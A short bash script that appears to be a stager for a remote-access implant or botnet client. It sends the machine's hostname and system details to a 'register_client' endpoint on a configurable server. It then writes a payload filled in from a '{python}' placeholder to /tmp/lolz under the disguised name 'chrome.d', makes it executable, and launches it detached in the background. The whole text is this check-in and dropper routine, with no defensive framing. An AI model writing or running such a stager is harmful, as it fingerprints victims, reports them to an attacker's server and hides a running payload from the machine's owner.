#!/bin/bash

FILENAME=chrome.d
HOST=localhost:5000

HOSTNAME=`hostname`
UNAME=`uname -a`

nice curl http://$HOST/register_client --data "hostname=$HOSTNAME&uname=$UNAME"

mkdir -p /tmp/lolz && cd /tmp/lolz


cat>$FILENAME<<EOF
{python}
EOF

chmod +x $FILENAME

if which screen &> /dev/null; then
    # screen found
    screen -d ./$FILENAME
else
    # lol no screen
    nohup ./$FILENAME &
fi


